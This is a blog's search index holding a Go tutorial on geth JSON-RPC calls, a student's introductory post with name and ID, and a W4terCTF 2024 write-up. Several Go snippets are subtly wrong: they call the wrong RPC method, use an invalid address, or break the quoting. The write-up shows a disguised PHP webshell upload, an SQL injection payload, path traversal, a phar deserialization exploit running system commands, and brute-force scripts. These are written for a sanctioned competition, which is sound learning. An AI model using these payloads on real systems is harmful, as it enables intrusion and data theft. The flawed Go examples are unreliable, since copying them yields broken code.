<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Go调用geth JSON RPC接口</title>
    <url>/2024/03/27/Go%E8%B0%83%E7%94%A8geth_JSON_RPC%E6%8E%A5%E5%8F%A3/</url>
    <content><![CDATA[<p>在Go中调用以太坊的格式如下</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">client, _ := rpc.Dial(<span class="string">&quot;http://localhost:8545&quot;</span>)</span><br><span class="line"><span class="keyword">var</span> result <span class="type">bool</span></span><br><span class="line">client.Call(&amp;result ,<span class="string">&quot;net_listening&quot;</span>) </span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>有以下常用接口</p>
<h2><span id="net">net</span></h2><p>1、net_version<br>当前连接网络的ID</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> networkid <span class="type">string</span></span><br><span class="line">client.Call(&amp;networkid,<span class="string">&quot;net_version&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>2、net_listening<br>客户端是否处于监听状态</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> is_listing <span class="type">bool</span></span><br><span class="line">client.Call(&amp;is_listing,<span class="string">&quot;net_listening&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2><span id="eth">eth</span></h2><p>1、eth_accounts<br>返回账户地址数组</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> accounts []<span class="type">string</span></span><br><span class="line">client.Call(&amp;accounts,<span class="string">&quot;eth_accounts&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>2、eth_getBalance<br>需要传入账户地址，返回余额，单位是<em>wei</em><br> “latest” 表示你要查询的是当前链上最新的账户余额</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> balance <span class="type">string</span></span><br><span class="line">client.Call(&amp;balance,<span class="string">&quot;eth_getBalance&quot;</span>,<span class="string">&quot;0x558c90c05d8c4b55a87de03bd601fd76faf50f9b&quot;</span>,<span class="string">&quot;latest&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>3、eth_coinbase<br>获取挖矿账户地址</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> proto_version <span class="type">string</span></span><br><span class="line">client.Call(&amp;proto_version , <span class="string">&quot;eth_protocolVersion&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>4、eth_mining<br>返回客户端是否在挖矿</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> is_mining <span class="type">bool</span></span><br><span class="line">client.Call(&amp;is_mining,<span class="string">&quot;eth_mining&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>5、eth_getTransactionCount<br>返回指定地址发生的交易数量</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> transactionCount <span class="type">string</span></span><br><span class="line">client.Call(&amp;transactionCount,<span class="string">&quot;eth_getBalance&quot;</span>,<span class="string">&quot;0x72w12d05d8c4b55a87de03bd601fd76faf50f9b&quot;</span>,<span class="string">&quot;latest&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>6、eth_blockNumber<br>获取当前块编号</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> blockNum <span class="type">string</span></span><br><span class="line">client.Call(&amp;blockNum ,<span class="string">&quot;eth_blockNumber&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2><span id="personal">personal</span></h2><p>1、personal_listAccounts<br>获取该节点下的所有账户</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> accounts []<span class="type">string</span></span><br><span class="line">client.Call(&amp;accounts,<span class="string">&quot;personal_listAccounts&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>2.personal_newAccount<br>创建用户，需要将密码作为参数传入</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> newAccount <span class="type">string</span></span><br><span class="line">client.Call(&amp;newAccount, <span class="string">&quot;personal_newAccount&quot;</span>, <span class="string">&quot;12345678&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>3.personal_lockAccount<br>锁定指定账户，需要将地址作为参数传入</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> is_lock <span class="type">bool</span></span><br><span class="line">client.Call(&amp;is_lock, <span class="string">&quot;personal_lockAccount&quot;</span>, <span class="string">&quot;账户地址&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>4.personal_unlockAccount<br>解锁指定账户,有些操作必须解锁账户才可以操作</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> is_unlock <span class="type">bool</span></span><br><span class="line">client.Call(&amp;is_unlock, <span class="string">&quot;personal_lockAccount&quot;</span>, <span class="string">&quot;账户地址&quot;</span>,<span class="string">&quot;账户密码&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2><span id="db">db</span></h2><p>1.db_putString<br>在本地数据库中存入字符串</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> is_ok <span class="type">bool</span></span><br><span class="line">client.Call(&amp;is_ok, <span class="string">&quot;db_putString&quot;</span>, <span class="string">&quot;db_name&quot;</span>,<span class="string">&quot;key&quot;</span>,<span class="string">&quot;&quot;</span>value<span class="string">&quot;)</span></span><br></pre></td></tr></table></figure>

<p>2.db_getString<br>从本地数据库读取字符串</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> val <span class="type">string</span></span><br><span class="line">client.Call(&amp;val, <span class="string">&quot;db_getString&quot;</span>, <span class="string">&quot;db_name&quot;</span>,<span class="string">&quot;key&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>科研</category>
      </categories>
  </entry>
  <entry>
    <title>My First Post</title>
    <url>/2024/03/23/My-First-Post/</url>
    <content><![CDATA[<h2><span id="start-my-blogging-journey">Start My Blogging Journey</span></h2><p>This is my first post. Although it seems to be essential, I have never done this before.<br>I want to create my own blog, which can show my identity.</p>
<h2><span id="another-reason">Another Reason</span></h2><p>I am publishing this blog post as part of my assignment for the cloud computing course.<br>My name is 黄梓铭 and my ID number is 21311151.</p>
]]></content>
      <categories>
        <category>startup</category>
      </categories>
  </entry>
  <entry>
    <title>W4terCTF 2024 Writeup</title>
    <url>/2024/04/29/W4terCTF_2024_Writeup/</url>
    <content><![CDATA[<h2><span id="前言">前言</span></h2><p>这是我第一次参加 <em>CTF</em> 竞赛，感觉还是很好玩的，也很有收获<br>由于本人是第一次参加CTF比赛，所以一开始不知道得到flag需要截图，所以有些题目没有flag截图，一些流程的图片也没有截到。但是我会尽量将思路讲清楚的</p>
<span id="more"></span>

<h2><span id="writeup">Writeup</span></h2><h3><span id="misc">MISC</span></h3><h4><span id="brokenmp4">broken.mp4</span></h4><p>该题使用untrunc软件，以下载附件得到的第一个视频为reference file，以第二个视频为truncate file，生成第二个视频的修复视频，在视频的最后就可以获得flag</p>
<img data-src="/2024/04/29/W4terCTF_2024_Writeup/broken.png" class>

<h4><span id="sign-in">Sign in</span></h4><p>该题通过在榜单寻找W4terDr0p队伍，即可获得flag</p>
<img data-src="/2024/04/29/W4terCTF_2024_Writeup/Signin.png" class>
<h4><span id="priv-escape">Priv Escape</span></h4><p>通过sudo -l 可以发现，&#x2F;usr&#x2F;sbin&#x2F;nginx对于当前用户，是被r00t赋权执行的，这就是本题的突破口。那么，解题的流程就应该是：通过r00t开启nginx服务，暴露一个端口，当前用户在访问这个端口的时候，可以通过该端口获取flag<br>具体流程：<br>直接开启nginx肯定是不可行的，关注到nginx的启动命令，可以通过-c 指定nginx.conf的路径。所以要先自己写一个nginx.conf，内容如下（只截取重要部分）：</p>
<p>这里要指定pid的路径，a.pid是自己创建的，而且这个pid的值需要先通过sudo -u r00t &#x2F;usr&#x2F;sbin&#x2F;nginx启动nginx，并用ps -ef | grep nginx 获取到（此处为120），再通过echo输入到a.pid</p>
<img data-src="/2024/04/29/W4terCTF_2024_Writeup/Priv1.png" class>
<img data-src="/2024/04/29/W4terCTF_2024_Writeup/Priv2.png" class>

<p>这些都要指定到可以访问的目录，否则会报错</p>
<img data-src="/2024/04/29/W4terCTF_2024_Writeup/Priv3.png" class>
<img data-src="/2024/04/29/W4terCTF_2024_Writeup/Priv4.png" class>

<p>所有的include 也要注释掉，不然会报错</p>
<img data-src="/2024/04/29/W4terCTF_2024_Writeup/Priv5.png" class>
<img data-src="/2024/04/29/W4terCTF_2024_Writeup/Priv6.png" class>

<p>此处暴露18888端口供当前用户访问</p>
<img data-src="/2024/04/29/W4terCTF_2024_Writeup/Priv7.png" class>

<p>tips：所有的文件创建都可以通过touch + echo 的方式写入，如果写错了，就rm后重写</p>
<p>然后就可以通过sudo -u r00t &#x2F;usr&#x2F;sbin&#x2F;nginx -c &#x2F;home&#x2F;W4terCTFPlayer&#x2F;nginx.conf 开启nginx服务<br>tips：在此之前，要确定&#x2F;home&#x2F;W4terCTFPlayer下的所有文件可读，可以通过 chmod -R 777  &#x2F;home&#x2F;W4terCTFPlayer 实现</p>
<p>最后，就可以通过curl 127.0.0.1:18888 访问到flag啦</p>
<img data-src="/2024/04/29/W4terCTF_2024_Writeup/Priv8.png" class>

<h4><span id="gz-gpt">GZ GPT</span></h4><p>一开始真的是一点头绪没有，只知道flag、CTF输入的时候会有不一样的回答，然后就一直卡在这。<br>然后后面有出现的这些“东西”，我真的有一大段时间认为是乱码！！！因为我用cmd的时候会有乱码出现，然后一直没有管（啊啊啊救命）</p>
<img data-src="/2024/04/29/W4terCTF_2024_Writeup/GZ1.png" class>

<p>实际上认真观察之后可以发现，这里是有两种图案，而且有八个，所以就能联想到是八位二进制<br>那么我们可以验证一下，发现第一第二个二进制转ASCII 后就是W4，就可以确认是正确的解答方法了<br>然后不断发请求，会发现过了一轮有一句话是没有符号的，说明已经到结尾了。这时就可以将这些二进制数输入转换器，得到以下结果</p>
<img data-src="/2024/04/29/W4terCTF_2024_Writeup/GZ2.png" class>

<h4><span id="spam-2024">Spam 2024</span></h4><p>首先拿到一个很长的垃圾邮件，很容易想到是Spam Encode生成的，Decode 后得到如下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">59,6f,75,20,6c,69,6b,65,20,65,6d,6f,6a,69,73,2c,20,64,6f,6e,27,74,20,79,6f,75,3f,0a,0a,01f643,01f4b5,01f33f,01f3a4,01f6aa,01f30f,01f40e,01f94b,01f6ab,01f606,2705,01f606,01f6b0,01f4c2,01f32a,263a,01f6e9,01f30f,01f4c2,01f579,01f993,01f405,01f375,01f388,01f600,01f504,01f6ab,01f3a4,01f993,2705,01f4ee,01f3a4,01f385,01f34e,01f643,01f309,01f383,01f34d,01f374,01f463,01f6b9,01f923,01f418,01f3f9,263a,01f463,01f4a7,01f463,01f993,01f33f,2328,01f32a,01f30f,01f643,01f375,2753,2602,01f309,01f606,01f3f9,01f375,01f4a7,01f385,01f449,01f30a,01f6b9,01f6aa,01f374,01f60e,01f383,01f32a,01f643,01f441,01f94b,01f451,01f4a7,01f418,01f3a4,01f94b,01f418,01f6e9,01f923,01f309,01f6e9,23e9,01f60d,2753,01f418,01f621,2600,01f60d,01f643,01f601,01f600,01f601,01f6ab,01f4c2,2705,2603,01f6ab,01f60e,01f52a,01f451,01f600,01f579,01f6ab,01f60d,01f32a,01f4c2,01f44c,01f34d,01f44c,01f993,01f590,01f923,01f60e,01f3ce,01f34d,01f3f9,01f34c,01f34d,01f3a4,2600,01f3f9,01f388,01f6b0,01f4a7,2600,2709,01f3f9,01f34d,01f993,01f385,01f374,2602,23e9,01f6aa,01f40d,263a,01f418,01f607,01f621,01f375,01f30f,01f993,01f375,01f6e9,01f4c2,01f44c,01f3f9,01f5d2,01f5d2,0a,0a,42,74,77,2c,20,74,68,65,20,6b,65,79,20,69,73,20,22,4b,45,59,22</span><br></pre></td></tr></table></figure>

<p>可以看到，这里面包含了两种编码，一种是59形式 ，另一种是01f643 形式，第一种很容易看出是十六进制，所以放到 CyberChef 中解码得到如下内容：</p>
<img data-src="/2024/04/29/W4terCTF_2024_Writeup/Spam1.png" class>

<p>根据提示，第二种形式的编码应该是 emoji 的 Unicode 编码，所以我写了一个小程序对其进行转换</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">unicode_to_emoji</span>(<span class="params">input_string</span>):</span><br><span class="line">    <span class="comment"># 将输入的unicode字符串按逗号分割成列表</span></span><br><span class="line">    unicode_list = input_string.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建一个空列表，用于存储转换后的emoji</span></span><br><span class="line">    emoji_list = []</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 遍历unicode列表，将每个unicode转换为对应的emoji，并加入到emoji列表中</span></span><br><span class="line">    <span class="keyword">for</span> unicode_char <span class="keyword">in</span> unicode_list:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            emoji_char = <span class="built_in">chr</span>(<span class="built_in">int</span>(unicode_char.strip(), <span class="number">16</span>))</span><br><span class="line">            emoji_list.append(emoji_char)</span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Invalid Unicode: <span class="subst">&#123;unicode_char.strip()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 返回逗号分隔的转换后的emoji字符串</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(emoji_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试</span></span><br><span class="line">unicode_input = <span class="built_in">input</span>(<span class="string">&quot;请输入以逗号分隔的Unicode字符串：&quot;</span>)</span><br><span class="line">emoji_output = unicode_to_emoji(unicode_input)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;转换后的Emoji字符串为：&quot;</span>, emoji_output)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">🙃💵🌿🎤🚪🌏🐎🥋🚫😆✅😆🚰📂🌪☺🛩🌏📂🕹🦓🐅🍵🎈😀🔄🚫🎤🦓✅📮🎤🎅🍎🙃🌉🎃🍍🍴👣🚹🤣🐘🏹☺👣💧👣🦓🌿⌨🌪🌏🙃🍵❓☂🌉😆🏹🍵💧🎅👉🌊🚹🚪🍴😎🎃🌪🙃👁🥋👑💧🐘🎤🥋🐘🛩🤣🌉🛩⏩😍❓🐘😡☀😍🙃😁😀😁🚫📂✅☃🚫😎🔪👑😀🕹🚫😍🌪📂👌🍍👌🦓🖐🤣😎🏎🍍🏹🍌🍍🎤☀🏹🎈🚰💧☀✉🏹🍍🦓🎅🍴☂⏩🚪🐍☺🐘😇😡🍵🌏🦓🍵🛩📂👌🏹🗒🗒</span><br></pre></td></tr></table></figure>

<p>这个编码也能比较容易看出，就是emoji-AES编码（emoji-AES编码的开头和结尾是有一定格式的）<br>那么关键就在于密钥，提示中说了密钥为KEY，但是解密一直在报错，奇怪了！密文大概率是没有错误的，也没有其他提示密文要做进一步变换，那么难道是密钥的问题吗？<br>这里出题人给我们挖了一个“小”坑，那就是 KEY 并不是密钥，🔑才是，因为 “I like emoji” 😂<br>解密成功得到如下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x???? ⊕ dxBUQVJndGJbbGByE3tGUW57VxV0bH9db3FSe2YFUndUexVUYWl/QW1FAW1/bW57EhQSEF0=</span><br></pre></td></tr></table></figure>

<p>这里的提示倒是蛮明显的，左边是一个4位16进制数，中间是异或，右边是类似于base64的编码。既然只是4位16进制，那么最大也就65536，完全可以爆破得出明文。<br>所以写个代码把所有可能结果输出，然后找就好啦</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># Base64 编码的字符串</span></span><br><span class="line">encoded_data = <span class="string">&#x27;dxBUQVJndGJbbGByE3tGUW57VxV0bH9db3FSe2YFUndUexVUYWl/QW1FAW1/bW57EhQSEF0=&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Base64 解码</span></span><br><span class="line">decoded_bytes = base64.b64decode(encoded_data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历所有可能的0x0000到0xFFFF（65535）</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10000</span>):</span><br><span class="line">    <span class="comment"># 将整数i转化为两字节形式</span></span><br><span class="line">    key = i.to_bytes(<span class="number">2</span>, <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建用于XOR操作的完整密钥，重复匹配数据长度</span></span><br><span class="line">    full_key = key * (<span class="built_in">len</span>(decoded_bytes) // <span class="built_in">len</span>(key)) + key[:<span class="built_in">len</span>(decoded_bytes) % <span class="built_in">len</span>(key)]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># XOR解密</span></span><br><span class="line">    xored_result = <span class="built_in">bytes</span>([b ^ k <span class="keyword">for</span> b, k <span class="keyword">in</span> <span class="built_in">zip</span>(decoded_bytes, full_key)])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 尝试解码为字符串，检查是否有意义的输出（ASCII可打印字符）</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        decoded_text = xored_result.decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">        <span class="comment"># 打印可能有意义的结果，并且第一个字符为W，第二个字符为4</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">all</span>(<span class="number">32</span> &lt;= <span class="built_in">ord</span>(c) &lt;= <span class="number">126</span> <span class="keyword">or</span> c <span class="keyword">in</span> <span class="string">&#x27;\r\n\t&#x27;</span> <span class="keyword">for</span> c <span class="keyword">in</span> decoded_text) <span class="keyword">and</span> decoded_text[<span class="number">0</span>] == <span class="string">&#x27;W&#x27;</span> <span class="keyword">and</span> decoded_text[<span class="number">1</span>] == <span class="string">&#x27;4&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;Key <span class="subst">&#123;i:04x&#125;</span>:&#x27;</span>, decoded_text)</span><br><span class="line">    <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">        <span class="comment"># 如果无法解码为ASCII，忽略错误</span></span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>

<p>得出明文如下：<br><code>Key 2420: W4terCTF&#123;H@V3_fuN_w1TH_yOUr_F!rSt_5pAM_eMa!I_IN_2024&#125;</code></p>
<h3><span id="pwn">Pwn</span></h3><h4><span id="remember-it-0">Remember It 0</span></h4><p>该题通过访问容器，连续答对10个string后，获得shell，ls发现目录中有flag，再用cat flag 命令得到flag</p>
<h3><span id="web">Web</span></h3><h4><span id="gitzip">GitZip</span></h4><p>本题用到burp抓包，在routes.js文件中发现其中aget(‘&#x2F;:htmlname’) 可以穿透攻击，将htmlname设为..&#x2F;就可以访问到父级目录，通过这个方法，在&#x2F;tmp&#x2F;flag前面不断加..&#x2F;，一层一层往上测试（在哪一层我忘记了，当时没有截图），用burp发送Get请求报文，就能在响应报文中找到flag了。<br>这里有个要注意的点是url必须通过编码再发送请求，否则无法找到flag。</p>
<h4><span id="png-server">PNG Server</span></h4><p>首先用.txt写一个一句话木马，在文件头部加上GIF87a，这样就能识别为gif，可以成功上传<br>然后，注意到php.ini中有cgi.fix_pathinfo&#x3D;1 这么一句话。<br>cgi.fix_pathinfo的解释如下：<br>该选项位于配置文件php.ini中，默认值为1，表示开启。当php遇到文件路径&#x2F;test.png&#x2F;x.php时，若&#x2F;test.png&#x2F;x.php不存在，则会去掉最后的&#x2F;x.php，然后判断&#x2F;test.png是否存在，若存在，则把&#x2F;test.png当做文件&#x2F;test.png&#x2F;x.php解析，如若test.png还不存在如果在其前面还有后缀，继续前面的步骤，以此类推。若是关闭该选项，访问&#x2F;test.jpg&#x2F;x.php 只会返回找不到文件。</p>
<p>所以，上传图片后，用burp抓到响应报文，获取到图片的位置，再使用蚁剑连接，配置如下：<br>利用上面提到的性质，只需要在.png后面再添加 &#x2F;任意名字.php，这样图片马就能被当成php执行了</p>
<img data-src="/2024/04/29/W4terCTF_2024_Writeup/PNG1.png" class>

<p>连接成功后，回到父级目录，就能找到&#x2F;flag</p>
<img data-src="/2024/04/29/W4terCTF_2024_Writeup/PNG2.png" class>

<h4><span id="user-manager">User Manager</span></h4><p>该题在查看main.go的时候，发现在order_by字段作sql注入。<br>首先通过burp抓到一个正常的Get &#x2F;users包，通过修改order_by&#x3D; 后的字段，猜出名字的列名是Name和密码的列名是Secret，然后猜想数据表名叫users，经过测试发现没有问题。<br>然后将order_by&#x3D; 后的字段改为以下语句<br><code>Secret; INSERT INTO users (Name) SELECT Secret FROM users;</code><br>意思是将Secret列的内容全部覆盖Name列内容<br>经过编码后是<br><code>Secret%3B%20INSERT%20INTO%20users%20(Name)%20SELECT%20Secret%20FROM%20users%3B</code><br>这样在响应报文中就会发现，Name字段中出现了flag</p>
<h4><span id="auto-unserialize">Auto Unserialize</span></h4><p>这是一个反序列化的题，在访问到的php代码中发现file_exist的参数是可以人为指定的</p>
<img data-src="/2024/04/29/W4terCTF_2024_Writeup/Auto1.png" class>

<p>而且，对于文件的上传也没有很强的检测，只是判断是不是jpg<br>所以可以用 phar反序列化，构造一个 伪装成jpg的 .phar文件，代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">command_test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$command</span> = <span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title function_ invoke__">command_test</span>();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;shell.phar&quot;</span>); <span class="comment">//生成一个phar文件，文件名为shell.phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt; <span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&lt;?php __HALT_COMPILER();?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$user</span>); <span class="comment">//将对象user写入到metadata中</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;shell.txt&quot;</span>,<span class="string">&quot;haha&quot;</span>); <span class="comment">//添加压缩文件，文件名字为shell.txt,内容为haha</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>执行后得到 .phar 文件，用curl 上传文件，发现上传成功</p>
<img data-src="/2024/04/29/W4terCTF_2024_Writeup/Auto2.png" class>

<p>然后在网页地址栏输入以下url：<br><code>http://127.0.0.1:49962/?img_file=phar://check.jpg</code></p>
<p>就能获取到flag了</p>
<img data-src="/2024/04/29/W4terCTF_2024_Writeup/Auto3.png" class>

<h3><span id="reverse">Reverse</span></h3><h4><span id="shuffle-puts">Shuffle Puts</span></h4><p>使用BinaryAI，输入meow文件，在ASCII字符串中获取到flag</p>
<img data-src="/2024/04/29/W4terCTF_2024_Writeup/Shuffle.png" class>

<h4><span id="bruteforceme">BruteforceMe</span></h4><p>首先拿到一个elf文件，放到BinaryAI中，看一下这个文件相关的函数，以下是main函数</p>
<img data-src="/2024/04/29/W4terCTF_2024_Writeup/BruteforceMe1.png" class>

<p>可以看到几个提示：<br>1、	flag的长度应该为0x2b，也就是43<br>2、	flag会被FUN_00101209函数处理，然后再被FUN_00101290 函数处理<br>3、	当输入的flag长度正确，即使内容不正确，也会有一个语句提示正确的位数<br>4、	查看这两个函数，都是对flag做一定的转换，主要是第二个函数，是一个base64编码的函数<br>知道了以上信息之后，就可以通过输出，开始猜这个flag是什么。<br>以下编写了一个脚本，实现的效果是，对 { } 内的值猜测</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 待输入的字符串</span></span><br><span class="line">input_string=<span class="string">&quot;W4terCTF&#123;UNr31AT3DN6YtEs_caN_b3_3n1m3RAtEd&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># num</span></span><br><span class="line"><span class="comment"># _6Y</span></span><br><span class="line">input_length=<span class="variable">$&#123;#input_string&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成一个包含所有可能字符的数组</span></span><br><span class="line">all_chars=(&#123;0..9&#125; &#123;A..Z&#125; &#123;a..z&#125; _)</span><br><span class="line">num_chars=<span class="variable">$&#123;#all_chars[@]&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义修改位置的起点</span></span><br><span class="line">start_position=19</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化最大匹配数字和字符串</span></span><br><span class="line">max_matched=0</span><br><span class="line">max_matched_string=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 循环调用程序</span></span><br><span class="line"><span class="keyword">for</span> ((i=<span class="number">0</span>; i&lt;<span class="variable">$num_chars</span>; i++)); <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">for</span> ((j=<span class="number">0</span>; j&lt;<span class="variable">$num_chars</span>; j++)); <span class="keyword">do</span></span><br><span class="line">        <span class="comment"># 构建当前的变化字符串</span></span><br><span class="line">        new_string=<span class="string">&quot;<span class="variable">$&#123;input_string:0:$start_position&#125;</span><span class="variable">$&#123;all_chars[i]&#125;</span><span class="variable">$&#123;all_chars[j]&#125;</span><span class="variable">$&#123;input_string:$((start_position + 2))&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 调用程序并获取输出结果</span></span><br><span class="line">        result=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$new_string</span>&quot;</span> | ./BruteforceMe)</span><br><span class="line">        <span class="comment">#echo &quot;$new_string&quot;</span></span><br><span class="line">	<span class="comment">#echo &quot;$result&quot;</span></span><br><span class="line">        <span class="comment"># 提取第一个数字值</span></span><br><span class="line">        matched=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$result</span>&quot;</span> | grep -oP <span class="string">&#x27;\d+(?= out of)&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> [ <span class="variable">$matched</span> -gt <span class="variable">$max_matched</span> ]; <span class="keyword">then</span></span><br><span class="line">            max_matched=<span class="variable">$matched</span></span><br><span class="line">            max_matched_string=<span class="variable">$new_string</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出第一个数字值最大的字符串</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;String with the maximum first digit: <span class="variable">$max_matched_string</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>这个脚本是半自动的，每一次都需要自己修改start_position和input_string，在全都过一遍之后发现并没有全对，奇怪了！</p>
<img data-src="/2024/04/29/W4terCTF_2024_Writeup/BruteforceMe2.png" class>

<p>其实是本身这个脚本有缺陷，在base64编码中，应该是每3个字符为一组，改成4个字符。而在这个脚本中，其实是每两个字符进行猜测，这样很有可能在某个位置猜错了，所以需要人工排错。<br>那应该怎样做呢？也是通过3个字符为一组这个性质，一个个组排查，比如：<br>先将UNr全部替换为某个一定不会在flag出现的符号，输入程序</p>
<img data-src="/2024/04/29/W4terCTF_2024_Writeup/BruteforceMe3.png" class>

<p>发现正确的数量少了4个，说明这个组都是对的。<br>通过这样的方法一步步排查，最终发现是 N6Y 组和 n1m 组出现了问题，此时如何纠错呢？<br>因为每个组的长度为3，那么肯定前两个字符或者后两个字符，是用脚本被一起猜的，比如，在n1m 中，1m是被一起猜出来的。<br>那么现在我对n1这两个位置，用前面的脚本猜，就会发现n1变成了nu，相同的方法用于N6Y ，发现变成 _6Y<br>把新的flag提交到程序，发现终于对了</p>
<img data-src="/2024/04/29/W4terCTF_2024_Writeup/BruteforceMe4.png" class>

<p>后记：其实在半自动脚本那里会有更简单的方法</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 待输入的字符串</span></span><br><span class="line">input_string=<span class="string">&quot;W4terCTF&#123;000000000000000000000000000000000&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成一个包含所有可能字符的数组</span></span><br><span class="line">all_chars=(&#123;0..9&#125; &#123;A..Z&#125; &#123;a..z&#125; _)</span><br><span class="line">num_chars=<span class="variable">$&#123;#all_chars[@]&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化最大匹配数字和字符串</span></span><br><span class="line">max_matched=16  <span class="comment"># W4terCTF 不需要判断</span></span><br><span class="line">max_matched_string=<span class="string">&quot;W4terCTF&#123;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 每次循环遍历三个字符</span></span><br><span class="line"><span class="keyword">for</span> ((i=<span class="number">9</span>; 